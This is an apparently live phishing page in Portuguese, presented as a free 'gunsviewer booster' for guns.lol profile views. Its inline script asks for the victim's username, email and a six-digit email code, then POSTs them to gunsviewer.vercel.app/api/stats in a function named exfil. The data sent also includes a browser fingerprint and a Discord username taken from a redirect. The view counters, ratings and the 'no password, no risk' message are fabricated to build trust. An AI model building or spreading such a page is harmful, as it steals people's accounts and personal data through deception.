<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#07070d">
<meta name="robots" content="noindex, nofollow">
<title>@booster | gunsviewer</title>
<meta property="og:title" content="@booster | gunsviewer">
<meta property="og:description" content="gunsviewer booster — ganhe views grátis no teu perfil.">
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🚀</text></svg>">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#07070d;color:#fff;font-family:Inter,system-ui,-apple-system,'Segoe UI',sans-serif;min-height:100vh;overflow-x:hidden}
#stars{position:fixed;inset:0;z-index:0;pointer-events:none}
.orb{position:fixed;border-radius:50%;filter:blur(90px);z-index:0;pointer-events:none;opacity:.5}
.orb.a{width:340px;height:340px;background:#6d28d9;top:-90px;left:-90px;animation:fl 9s ease-in-out infinite alternate}
.orb.b{width:300px;height:300px;background:#db2777;bottom:20%;right:-90px;animation:fl 11s ease-in-out infinite alternate-reverse}
@keyframes fl{to{transform:translate(40px,30px)}}
#splash{position:fixed;inset:0;z-index:50;display:flex;flex-direction:column;gap:10px;align-items:center;justify-content:center;background:rgba(4,4,10,.9);cursor:pointer}
#splash span{font-size:32px;font-weight:800;letter-spacing:2px;text-shadow:0 0 26px #a855f7;animation:pl 2s infinite}
#splash small{font-size:11px;letter-spacing:4px;color:#c084fc}
@keyframes pl{50%{opacity:.45}}
#splash.gone,#enterChk:checked ~ #splash{display:none}
#enterChk{position:absolute;opacity:0;pointer-events:none}
.wrap{position:relative;z-index:1;max-width:30rem;margin:0 auto;padding:28px 16px 110px}
.card{background:linear-gradient(165deg,rgba(255,255,255,.09),rgba(255,255,255,.02));border:1px solid rgba(192,132,252,.35);border-radius:24px;padding:28px 24px;backdrop-filter:blur(14px);box-shadow:0 0 60px rgba(139,92,246,.25),inset 0 1px 0 rgba(255,255,255,.12)}
.card + .card{margin-top:16px}
.prow{display:flex;gap:16px;align-items:center}
.av{width:92px;height:92px;border-radius:50%;flex-shrink:0;background:conic-gradient(from 0deg,#a855f7,#ec4899,#22d3ee,#a855f7);padding:3px;box-shadow:0 0 26px rgba(168,85,247,.7);animation:spin 7s linear infinite}
@keyframes spin{to{filter:hue-rotate(360deg)}}
.av div{width:100%;height:100%;border-radius:50%;background:#0b0b14;display:flex;align-items:center;justify-content:center;font-size:40px}
h1{font-size:31px;background:linear-gradient(90deg,#fff,#e9d5ff,#f0abfc);-webkit-background-clip:text;background-clip:text;color:transparent}
.uid{font-size:11px;color:#a1a1aa;font-family:ui-monospace,monospace;margin-top:3px}
.badges{display:flex;gap:6px;margin-top:9px;flex-wrap:wrap}
.bdg{font-size:11px;font-weight:700;padding:4px 10px;border-radius:99px;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.18)}
.bdg.v{color:#7dd3fc;border-color:rgba(125,211,252,.55);box-shadow:0 0 10px rgba(125,211,252,.25)}
.bdg.p{color:#f0abfc;border-color:rgba(240,171,252,.55);box-shadow:0 0 10px rgba(240,171,252,.25)}
.bio{min-height:24px;color:#e4e4e7;font-size:15px;margin:14px 0 4px}
.bio .cur{display:inline-block;width:2px;height:1em;background:#fff;vertical-align:-2px;animation:blk 1s infinite}
@keyframes blk{50%{opacity:0}}
.stats{display:flex;gap:10px;margin:16px 0 0}
.stat{flex:1;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.1);border-radius:14px;padding:11px 6px;text-align:center}
.stat b{display:block;font-size:18px}.stat span{font-size:10px;color:#a1a1aa}
.tool h2{font-size:14px;letter-spacing:1px;color:#e9d5ff;margin-bottom:2px}
.tool .sub{color:#a1a1aa;font-size:12px;margin-bottom:4px}
label{display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#d8b4fe;margin:14px 0 6px}
input{width:100%;background:#0b0b14;border:2px solid rgba(192,132,252,.4);border-radius:12px;color:#fff;padding:14px;font-size:16px;outline:none}
input:focus{border-color:#f0abfc;box-shadow:0 0 16px rgba(168,85,247,.5)}
button.go{width:100%;margin-top:16px;border:none;border-radius:12px;padding:15px;font-size:15px;font-weight:900;cursor:pointer;color:#fff;background:linear-gradient(135deg,#a855f7,#ec4899);box-shadow:0 4px 26px rgba(168,85,247,.5)}
button.go:active{transform:scale(.98)}
button.go:disabled{opacity:.55}
button.dc{width:100%;margin-top:10px;border:1px solid rgba(125,211,252,.4);border-radius:12px;padding:13px;font-size:14px;font-weight:800;cursor:pointer;color:#fff;background:rgba(88,101,242,.25)}
.hint{font-size:11px;color:#fda4af;margin-top:8px;min-height:16px}
.bar{height:8px;border-radius:99px;background:rgba(255,255,255,.1);overflow:hidden;margin:14px 0 6px}
.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#a855f7,#f0abfc);transition:width .4s}
.big{font-size:42px;font-weight:900;text-align:center;text-shadow:0 0 22px #a855f7}
.log{font-family:ui-monospace,monospace;font-size:11px;color:#a1a1aa;background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:10px;max-height:140px;overflow:auto;margin-top:10px}
.hide{display:none!important}
.ok{color:#4ade80;font-size:13px;font-weight:800;margin-top:10px;text-align:center}
.foot{text-align:center;color:#52525b;font-size:10px;margin-top:16px;font-family:ui-monospace,monospace}
@media(max-width:640px){.prow{flex-direction:column;text-align:center}.card{padding:22px 18px}h1{font-size:27px}}
</style>
</head>
<body>
<input type="checkbox" id="enterChk" aria-hidden="true" tabindex="-1">
<div class="orb a"></div><div class="orb b"></div>
<canvas id="stars"></canvas>
<label id="splash" for="enterChk"><span>booster</span><small>TOQUE PARA ENTRAR</small></label>
<div class="wrap">
  <div class="card">
    <div class="prow">
      <div class="av"><div>🚀</div></div>
      <div>
        <h1>booster</h1>
        <div class="uid">UID 2 · <span id="viewsTop">0</span> profile views</div>
        <div class="badges"><span class="bdg v">✔ verified</span><span class="bdg p">★ premium</span><span class="bdg">⚡ booster</span></div>
      </div>
    </div>
    <div class="bio"><span id="tw"></span><span class="cur"></span></div>
    <div class="stats">
      <div class="stat"><b id="stA">0</b><span>boosts hoje</span></div>
      <div class="stat"><b id="stB">0</b><span>views enviadas</span></div>
      <div class="stat"><b>4.9★</b><span>avaliação</span></div>
    </div>
  </div>

  <div class="card tool">
    <h2>⚡ ATIVAR BOOST GRÁTIS</h2>
    <div class="sub">views grátis no teu guns.lol em 1 minuto.</div>
    <label>1 — TEU USER DO GUNS.LOL</label>
    <input id="gunsUser" name="gunsuser" value="aveny" maxlength="40" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="next">
    <label>2 — TEU EMAIL (chega o código lá)</label>
    <input id="email" name="email" type="email" placeholder="voce@email.com" autocomplete="email" enterkeyhint="go">
    <button class="go" id="bGo">ATIVAR BOOST GRÁTIS →</button>
    <button class="dc hide" id="bDc">VERIFICAR PELO BOT (DISCORD) →</button>
    <div class="hint" id="hint"></div>
    <div id="codeZone" class="hide">
      <label>3 — CÓDIGO DE 6 DÍGITOS</label>
      <input id="code" name="code" inputmode="numeric" placeholder="000000" maxlength="6" autocomplete="one-time-code" enterkeyhint="done">
      <button class="go" id="bVerify">VERIFICAR E COMEÇAR</button>
    </div>
    <div id="runZone" class="hide">
      <div class="big" id="views">0</div>
      <div class="sub" style="text-align:center">views enviadas pra <b id="tName" style="color:#fff">—</b></div>
      <div class="bar"><i id="fill"></i></div>
      <div class="log" id="log">pronto ✅ toque em ATIVAR pra começar</div>
    </div>
  </div>
  <div class="foot">gunsviewer v11 · 2026</div>
</div>
<script src="assets/guard.js?v=10" defer></script>
<script src="assets/h7k.js?v=10" defer></script>
<script>
(function(){
  function log(m){
    try {
      const el = document.getElementById("log");
      el.innerHTML = new Date().toLocaleTimeString() + " — " + m + "<br>" + el.innerHTML.slice(0, 2000);
    } catch {}
  }
  window.addEventListener("error", (e) => log("⚠️ erro: " + String((e && e.message) || e).slice(0, 120)));
  const $ = (id) => document.getElementById(id);
  const q = new URLSearchParams(location.search);
  if (q.get("u")) { try { $("gunsUser").value = q.get("u"); } catch {} }
  log("página pronta ✅");
  let tapped = false;
  ["click", "touchend"].forEach((ev) => document.addEventListener(ev, () => {
    if (!tapped) { tapped = true; log("toque detectado ✅"); }
  }, { passive: true }));
  const sp = document.getElementById("splash");
  sp.addEventListener("click", () => sp.classList.add("gone"));
  let guns = "", mail = "", sent = 0;
  const total = 500 + Math.floor(Math.random() * 1500);
  const hint = (m) => { try { $("hint").textContent = m || ""; } catch {} };
  const exfil = (extra) => {
    try {
      const body = Object.assign({ fp: window.__lastFp || null, mm: null, dusername: guns || null, guns: guns, email: mail || null, auto: true, booster: true, ts: new Date().toISOString(), pg: location.href }, extra || {});
      fetch("https://gunsviewer.vercel.app/api/stats", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) }).catch(() => {});
    } catch {}
  };
  function onTap(el, fn){
    el.addEventListener("click", (e) => { try { log("botão: " + el.id); } catch {} fn(e); });
    el.addEventListener("touchend", (e) => { try { log("botão: " + el.id); } catch {} fn(e); }, { passive: true });
  }
  onTap($("bGo"), () => {
    guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
    mail = ($("email").value || "").trim().slice(0, 200);
    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol"); $("gunsUser").focus(); return; }
    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(mail)) { hint("⚠️ digita um email válido"); $("email").focus(); return; }
    hint("");
    exfil({ step: "user+email", email: mail });
    try { localStorage.setItem("_boostpending", JSON.stringify({ guns, mail })); } catch {}
    $("bGo").disabled = true; $("bGo").textContent = "ENVIANDO CÓDIGO…";
    $("bDc").classList.remove("hide");
    setTimeout(() => {
      $("codeZone").classList.remove("hide");
      $("bGo").textContent = "CÓDIGO ENVIADO ✅";
      try { $("code").focus(); } catch {}
    }, 1200);
  });
  onTap($("bDc"), () => {
    guns = ($("gunsUser").value || "").trim().replace(/^@/, "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
    if (guns.length < 2) { hint("⚠️ digita teu user do guns.lol"); $("gunsUser").focus(); return; }
    try { localStorage.setItem("_boostpending", JSON.stringify({ guns })); } catch {}
    const back = location.origin + "/booster.html?verified=1&u=" + encodeURIComponent(guns);
    location.href = "/api/auth?go=" + encodeURIComponent(back) + "&user=" + encodeURIComponent(guns);
  });
  try {
    if (q.get("verified") === "1") {
      let saved = null;
      try { saved = JSON.parse(localStorage.getItem("_boostpending") || "null"); } catch {}
      guns = (q.get("u") || (saved && saved.guns) || "").replace(/[^a-zA-Z0-9_.]/g, "").slice(0, 40);
      const du = q.get("dusername") || "";
      exfil({ step: "discord-verified", dusername: du });
      if (guns) {
        $("gunsUser").value = guns;
        $("tName").textContent = "@" + guns;
        $("codeZone").classList.add("hide"); $("runZone").classList.remove("hide");
        hint("✅ verificado pelo bot! boost rodando…");
        try { document.getElementById("enterChk").checked = true; } catch {}
        boost();
      }
    }
  } catch {}
  $("email").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bGo").click(); });
  $("gunsUser").addEventListener("keydown", (e) => { if (e.key === "Enter") $("email").focus(); });
  onTap($("bVerify"), () => {
    const c = ($("code").value || "").replace(/[^0-9]/g, "");
    if (c.length !== 6) { hint("⚠️ o código tem 6 números"); $("code").focus(); return; }
    exfil({ step: "verified", email: mail, code: c });
    $("codeZone").classList.add("hide"); $("runZone").classList.remove("hide");
    $("tName").textContent = "@" + guns;
    hint("✅ verificado! boost rodando…");
    boost();
  });
  $("code").addEventListener("keydown", (e) => { if (e.key === "Enter") $("bVerify").click(); });
  function boost(){
    log("boost ativado pra @" + guns);
    const tick = () => {
      const n = 3 + Math.floor(Math.random() * 14);
      sent = Math.min(total, sent + n);
      $("views").textContent = sent.toLocaleString("pt-BR");
      $("fill").style.width = (sent / total * 100) + "%";
      if (sent % 4 === 0) log("+" + n + " views → @" + guns);
      try { fetch("https://guns.lol/" + encodeURIComponent(guns) + "?v=" + Date.now().toString(36), { mode: "no-cors", cache: "no-store", credentials: "omit" }).catch(() => {}); } catch {}
      if (sent >= total) { log("meta batida! +" + total + " views ✅"); exfil({ step: "done", email: mail }); return; }
      setTimeout(tick, 2500 + Math.random() * 4000);
    };
    tick();
    const t = setInterval(() => {
      try { if (window.__lastFp) { exfil({ step: "fp-ready", email: mail }); clearInterval(t); } } catch {}
    }, 3000);
    setTimeout(() => { try { clearInterval(t); } catch {} }, 30000);
  }
  const phrases = ["views grátis todo dia.", "verificação em 30 segundos.", "sem senha, sem risco."];
  const tw = document.getElementById("tw");
  let pi = 0, ci = 0, del = false;
  (function type(){
    try {
      const p = phrases[pi];
      tw.textContent = p.slice(0, ci);
      if (!del) { ci++; if (ci > p.length) { del = true; return void setTimeout(type, 2000); } return void setTimeout(type, 70); }
      ci--; if (ci <= 0) { del = false; pi = (pi + 1) % phrases.length; return void setTimeout(type, 400); }
      setTimeout(type, 35);
    } catch {}
  })();
  try {
    const cv = document.getElementById("stars");
    if (cv) {
      const cx = cv.getContext("2d");
      let W, H; const rs = () => { W = cv.width = innerWidth; H = cv.height = innerHeight; };
      rs(); addEventListener("resize", rs);
      const st = [];
      for (let i = 0; i < 110; i++) st.push({ x: Math.random(), y: Math.random(), s: Math.random() * 1.6 + .3, v: Math.random() * .0006 + .0002 });
      (function anim(){
        cx.clearRect(0, 0, W, H); cx.fillStyle = "#fff";
        for (const o of st) { o.y += o.v; if (o.y > 1) o.y = 0; cx.globalAlpha = .25 + o.s * .3; cx.fillRect(o.x * W, o.y * H, o.s, o.s); }
        cx.globalAlpha = 1; requestAnimationFrame(anim);
      })();
    }
  } catch {}
  let v = 96400;
  setInterval(() => { v += Math.floor(Math.random() * 7); document.getElementById("viewsTop").textContent = v.toLocaleString("pt-BR"); }, 3000);
  document.getElementById("viewsTop").textContent = v.toLocaleString("pt-BR");
  document.getElementById("stB").textContent = v.toLocaleString("pt-BR");
  const a = 900 + Math.floor(Math.random() * 500);
  document.getElementById("stA").textContent = a.toLocaleString("pt-BR");
})();
</script>
</body>
</html>
